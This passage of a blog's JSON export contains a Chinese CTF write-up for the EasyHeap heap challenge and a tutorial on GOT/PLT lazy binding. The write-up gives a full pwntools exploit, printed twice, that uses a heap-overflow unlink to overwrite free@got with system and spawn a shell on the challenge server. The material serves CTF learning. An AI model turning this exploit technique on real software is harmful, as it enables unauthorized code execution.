python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">27679</span>)<br>elf = ELF(<span class=\"hljs-string\">&quot;./easyheap&quot;</span>)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx, size, content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br><br>heaparray_addr = <span class=\"hljs-number\">0x6020E0</span><br>system_plt = elf.plt[<span class=\"hljs-string\">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br>delete(<span class=\"hljs-number\">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<h4 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h4><p><a href=\"https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap\">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>\n<h4 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>\n<p>因此可以溢出</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>\n<ol>\n<li><p>首先申请三个chunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/1.jpg\"></p>\n<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>\n</li>\n<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/2.jpg\"></p>\n<p>查看heaparray地址上的值：</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/3.jpg\"></p>\n<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>\n</li>\n<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>\n\n<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>\n</li>\n<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>\n\n<p>将其函数改为system函数的plt表</p>\n<blockquote>\n<p>因为system没有被调用过，不能直接改成system@got</p>\n</blockquote>\n</li>\n<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>\n</li>\n</ol>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">27679</span>)<br>elf = ELF(<span class=\"hljs-string\">&quot;./easyheap&quot;</span>)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx, size, content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br><br>heaparray_addr = <span class=\"hljs-number\">0x6020E0</span><br>system_plt = elf.plt[<span class=\"hljs-string\">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br>delete(<span class=\"hljs-number\">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"GOT表和PLT表","date":"2022-11-16T08:08:00.000Z","excerpt":"Linux 动态链接与延迟绑定机制","_content":"\nLinux 动态链接与延迟绑定机制\n\n**Q：**\n\n1. 为什么ret2libc泄露基址时要选择已经使用过的函数？\n2. 何为延迟绑定？\n\n## Linux 动态链接与延迟绑定机制\n\n​    假设，写了一个函数```f()```，调用了glibc中函数```x()```，在可执行文件是如何编译的？\n\n​\t对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数```f()```的汇编指令中直接call函数```x()```的真实地址\n\n​\t因此，需要在调用前加入一个寻找函数地址的过程\n\n```assembly\n.text\n ...\n call f_stub\n ...\n \n ...\n f_stub:\n \t 1. find and save function f() entry point in f_stub_addr\n     2. mov eax, [f_addr]\n        jmp eax\n ...\n \n.data\n f_addr  // 存储实际的f()地址\n```\n\n​\t如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它\n\n​\tlinux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)\n\n​\t后文会具体分析其机制\n\n\n\n\n##### 实验参考\n\n<https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL>\n\n<https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click>\n\n##### 代码\n\n```C\n#include <stdio.h>\nvoid print_banner()\n{\n    printf(\"Welcome to World of PLT and GOT\\n\");\n}\nint main(void)\n{\n    print_banner();\n    return 0;\n}\n```\n\n##### 编译链接\n\n```gcc -Wall  -g test.c -o test.o -m32```\n\n**平台**： **kali**-**linux**\n\n开始调试\n\n**首先，在printf函数调用前下一个断点**\n\n![](/img/plt&got/1.png)\n\n```assembly\n[-------------------------------------code-------------------------------------]\n   0x555555555134 <frame_dummy+4>:      jmp    0x5555555550b0 <register_tm_clones>\n   0x555555555139 <print_banner>:       push   rbp\n   0x55555555513a <print_banner+1>:     mov    rbp,rsp\n=> 0x55555555513d <print_banner+4>:     lea    rax,[rip+0xec4]        # 0x555555556008\n   0x555555555144 <print_banner+11>:    mov    rdi,rax\n   0x555555555147 <print_banner+14>:    call   0x555555555030 <puts@plt>\n   0x55555555514c <print_banner+19>:    nop\n   0x55555555514d <print_banner+20>:    pop    rbp\n```\n\n跳转到了0x555555555030这个地址，gdb对其的标注为\\<puts@plt\\>\n\n查看一下这个地址上的内容\n\n```assembly\ngdb-peda$ x/10i 0x555555555030\n   0x555555555030 <puts@plt>:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 <puts@got[plt]>\n   0x555555555036 <puts@plt+6>: push   0x0\n   0x55555555503b <puts@plt+11>:        jmp    0x555555555020\n```\n\n这里第一条指令，jmp 0x555555558000，gdb对其的标注为\\<puts@got[plt]\\>，查看这个地址上的值，会发现这个指令在原地跳转：\n\n```assembly\ngdb-peda$ x/x 0x555555558000 \n0x555555558000 <puts@got[plt]>: 0x0000555555555036 //这个地址就是上面plt表的第二条指令\n```\n\n相当于什么也没做\n\n那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，```jmp 0x555555555020```来完成的，这里先不对这个函数进行分析，直接来看结果\n\n**在printf函数后面下断点，重新查看刚才\\<puts@got[plt]\\>上的内容**\n\n![](/img/plt&got/2.jpg)\n\n```assembly\ngdb-peda$ x/x 0x555555558000\n0x555555558000 <puts@got[plt]>: 0x00007ffff7c75db0\n```\n\n发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址\n\n```assembly\ngdb-peda$ x/10i 0x00007ffff7c75db0\n   0x7ffff7c75db0 <__GI__IO_puts>:      push   r14\n   0x7ffff7c75db2 <__GI__IO_puts+2>:    push   r13\n   0x7ffff7c75db4 <__GI__IO_puts+4>:    push   r12\n   0x7ffff7c75db6 <__GI__IO_puts+6>:    mov    r12,rdi\n   0x7ffff7c75db9 <__GI__IO_puts+9>:    push   rbp\n   0x7ffff7c75dba <__GI__IO_puts+10>:   push   rbx\n   0x7ffff7c75dbb <__GI__IO_puts+11>:   sub    rsp,0x10\n   0x7ffff7c75dbf <__GI__IO_puts+15>:   call   0x7ffff7c28110 <*ABS*+0x99da0@plt>\n   0x7ffff7c75dc4 <__GI__IO_puts+20>:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18\n   0x7ffff7c75dcb <__GI__IO_puts+27>:   mov    rbx,rax\n```\n\n**因此可以得出结论**\n\n​\tplt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上\n\n​\t这样就是为什么ret2libc需要使用用已被调用过的函数\n\n*tips：*\n\n*linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)*\n\n\n\n**然后解决如何寻找函数地址的问题**：\n\n​\t在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：\n\n![](/img/plt&got/3.jpg)\n\n​\t这个push的值唯一标识了寻找的函数，\n\n​\t然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）\n\n```assembly\ngdb-peda$ x/10i 0x555555555020\n   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0\n   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8\n```\n\n如果在gdb未开始调试的时候，查看这个jmp的值，是0x0\n\n而在printf函数前的断点查看，会发现它发生了变化\n\n```assembly\ngdb-peda$ x/x 0x555555557ff8\n0x555555557ff8: 0x00007ffff7fdc080\n\ngdb-peda$ x/10i 0x00007ffff7fdc080\n   0x7ffff7fdc080 <_dl_runtime_resolve_xsavec>: push   rbx\n   0x7ffff7fdc081 <_dl_runtime_resolve_xsavec+1>:       mov    rbx,rsp\n   0x7ffff7fdc084 <_dl_runtime_resolve_xsavec+4>:       and    rsp,0xffffffffffffffc0\n   0x7ffff7fdc088 <_dl_runtime_resolve_xsavec+8>:\n    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 <_rtld_global_ro+432>\n   0x7ffff7fdc08f <_dl_runtime_resolve_xsavec+15>:      mov    QWORD PTR [rsp],rax\n   0x7ffff7fdc093 <_dl_runtime_resolve_xsavec+19>:      mov    QWORD PTR [rsp+0x8],rcx\n   0x7ffff7fdc098 <_dl_runtime_resolve_xsavec+24>:      mov    QWORD PTR [rsp+0x10],rdx\n   0x7ffff7fdc09d <_dl_runtime_resolve_xsavec+29>:      mov    QWORD PTR [rsp+0x18],rsi\n   0x7ffff7fdc0a2 <_dl_runtime_resolve_xsavec+34>:      mov    QWORD PTR [rsp+0x20],rdi\n   0x7ffff7fdc0a7 <_dl_runtime_resolve_xsavec+39>:      mov    QWORD PTR [rsp+0x28],r8\n\n```\n\n这个函数为```_dl_runtime_resolve(link_map_obj, reloc_index)```，此处不在对其具体分析，其用处即为寻找编号为```reloc_index```的函数\n\n\n\n##### 整体流程\n\n**第一次调用**\n\n![](/img/plt&got/4.jpg)\n\n**第二次调用**\n\n![](/img/plt&got/5.jpg)\n\n","source":"_posts/ctf-pwn/got表和plt表.md","raw":"---\ntitle: GOT表和PLT表\ntags: [ctf-pwn]\ndate: 2022-11-16 16:08:00\ncategories: [ctf-pwn]\nexcerpt: Linux 动态链接与延迟绑定机制\n---\n\nLinux 动态链接与延迟绑定机制\n\n**Q：**\n\n1. 为什么ret2libc泄露基址时要选择已经使用过的函数？\n2. 何为延迟绑定？\n\n## Linux 动态链接与延迟绑定机制\n\n​    假设，写了一个函数```f()```，调用了glibc中函数```x()```，在可执行文件是如何编译的？\n\n​\t对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数```f()```的汇编指令中直接call函数```x()```的真实地址\n\n​\t因此，需要在调用前加入一个寻找函数地址的过程\n\n```assembly\n.text\n ...\n call f_stub\n ...\n \n ...\n f_stub:\n \t 1. find and save function f() entry point in f_stub_addr\n     2. mov eax, [f_addr]\n        jmp eax\n ...\n \n.data\n f_addr  // 存储实际的f()地址\n```\n\n​\t如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它\n\n​\tlinux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)\n\n​\t后文会具体分析其机制\n\n\n\n\n##### 实验参考\n\n<https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL>\n\n<https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click>\n\n##### 代码\n\n```C\n#include <stdio.h>\nvoid print_banner()\n{\n    printf(\"Welcome to World of PLT and GOT\\n\");\n}\nint main(void)\n{\n    print_banner();\n    return 0;\n}\n```\n\n##### 编译链接\n\n```gcc -Wall  -g test.c -o test.o -m32```\n\n**平台**： **kali**-**linux**\n\n开始调试\n\n**首先，在printf函数调用前下一个断点**\n\n![](/img/plt&got/1.png)\n\n```assembly\n[-------------------------------------code-------------------------------------]\n   0x555555555134 <frame_dummy+4>:      jmp    0x5555555550b0 <register_tm_clones>\n   0x555555555139 <print_banner>:       push   rbp\n   0x55555555513a <print_banner+1>:     mov    rbp,rsp\n=> 0x55555555513d <print_banner+4>:     lea    rax,[rip+0xec4]        # 0x555555556008\n   0x555555555144 <print_banner+11>:    mov    rdi,rax\n   0x555555555147 <print_banner+14>:    call   0x555555555030 <puts@plt>\n   0x55555555514c <print_banner+19>:    nop\n   0x55555555514d <print_banner+20>:    pop    rbp\n```\n\n跳转到了0x555555555030这个地址，gdb对其的标注为\\<puts@plt\\>\n\n查看一下这个地址上的内容\n\n```assembly\ngdb-peda$ x/10i 0x555555555030\n   0x555555555030 <puts@plt>:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 <puts@got[plt]>\n   0x555555555036 <puts@plt+6>: push   0x0\n   0x55555555503b <puts@plt+11>:        jmp    0x555555555020\n```\n\n这里第一条指令，jmp 0x555555558000，gdb对其的标注为\\<puts@got[plt]\\>，查看这个地址上的值，会发现这个指令在原地跳转：\n\n```assembly\ngdb-peda$ x/x 0x555555558000 \n0x555555558000 <puts@got[plt]>: 0x0000555555555036 //这个地址就是上面plt表的第二条指令\n```\n\n相当于什么也没做\n\n那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，```jmp 0x555555555020```来完成的，这里先不对这个函数进行分析，直接来看结果\n\n**在printf函数后面下断点，重新查看刚才\\<puts@got[plt]\\>上的内容**\n\n![](/img/plt&got/2.jpg)\n\n```assembly\ngdb-peda$ x/x 0x555555558000\n0x555555558000 <puts@got[plt]>: 0x00007ffff7c75db0\n```\n\n发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址\n\n```assembly\ngdb-peda$ x/10i 0x00007ffff7c75db0\n   0x7ffff7c75db0 <__GI__IO_puts>:      push   r14\n   0x7ffff7c75db2 <__GI__IO_puts+2>:    push   r13\n   0x7ffff7c75db4 <__GI__IO_puts+4>:    push   r12\n   0x7ffff7c75db6 <__GI__IO_puts+6>:    mov    r12,rdi\n   0x7ffff7c75db9 <__GI__IO_puts+9>:    push   rbp\n   0x7ffff7c75dba <__GI__IO_puts+10>:   push   rbx\n   0x7ffff7c75dbb <__GI__IO_puts+11>:   sub    rsp,0x10\n   0x7ffff7c75dbf <__GI__IO_puts+15>:   call   0x7ffff7c28110 <*ABS*+0x99da0@plt>\n   0x7ffff7c75dc4 <__GI__IO_puts+20>:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18\n   0x7ffff7c75dcb <__GI__IO_puts+27>:   mov    rbx,rax\n```\n\n**因此可以得出结论**\n\n​\tplt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上\n\n​\t这样就是为什么ret2libc需要使用用已被调用过的函数\n\n*tips：*\n\n*linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)*\n\n\n\n**然后解决如何寻找函数地址的问题**：\n\n​\t在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：\n\n![](/img/plt&got/3.jpg)\n\n​\t这个push的值唯一标识了寻找的函数，\n\n​\t然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）\n\n```assembly\ngdb-peda$ x/10i 0x555555555020\n   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0\n   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8\n```\n\n如果在gdb未开始调试的时候，查看这个jmp的值，是0x0\n\n而在printf函数前的断点查看，会发现它发生了变化\n\n```assembly\ngdb-peda$ x/x 0x555555557ff8\n0x555555557ff8: 0x00007ffff7fdc080\n\ngdb-peda$ x/10i 0x00007ffff7fdc080\n   0x7ffff7fdc080 <_dl_runtime_resolve_xsavec>: push   rbx\n   0x7ffff7fdc081 <_dl_runtime_resolve_xsavec+1>:       mov    rbx,rsp\n   0x7ffff7fdc084 <_dl_runtime_resolve_xsavec+4>:       and    rsp,0xffffffffffffffc0\n   0x7ffff7fdc088 <_dl_runtime_resolve_xsavec+8>:\n    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 <_rtld_global_ro+432>\n   0x7ffff7fdc08f <_dl_runtime_resolve_xsavec+15>:      mov    QWORD PTR [rsp],rax\n   0x7ffff7fdc093 <_dl_runtime_resolve_xsavec+19>:      mov    QWORD PTR [rsp+0x8],rcx\n   0x7ffff7fdc098 <_dl_runtime_resolve_xsavec+24>:      mov    QWORD PTR [rsp+0x10],rdx\n   0x7ffff7fdc09d <_dl_runtime_resolve_xsavec+29>:      mov    QWORD PTR [rsp+0x18],rsi\n   0x7ffff7fdc0a2 <_dl_runtime_resolve_xsavec+34>:      mov    QWORD PTR [rsp+0x20],rdi\n   0x7ffff7fdc0a7 <_dl_runtime_resolve_xsavec+39>:      mov    QWORD PTR [rsp+0x28],r8\n\n```\n\n这个函数为```_dl_runtime_resolve(link_map_obj, reloc_index)```，此处不在对其具体分析，其用处即为寻找编号为```reloc_index```的函数\n\n\n\n##### 整体流程\n\n**第一次调用**\n\n![](/img/plt&got/4.jpg)\n\n**第二次调用**\n\n![](/img/plt&got/5.jpg)\n\n","slug":"ctf-pwn/got表和plt表","published":1,"updated":"2022-12-23T08:29:27.867Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gi000878uf8dyc5wrx","content":"<p>Linux 动态链接与延迟绑定机制</p>\n<p><strong>Q：</strong></p>\n<ol>\n<li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li>\n<li>何为延迟绑定？</li>\n</ol>\n<h2 id=\"Linux-动态链接与延迟绑定机制\"><a href=\"#Linux-动态链接与延迟绑定机制\" class=\"headerlink\" title=\"Linux 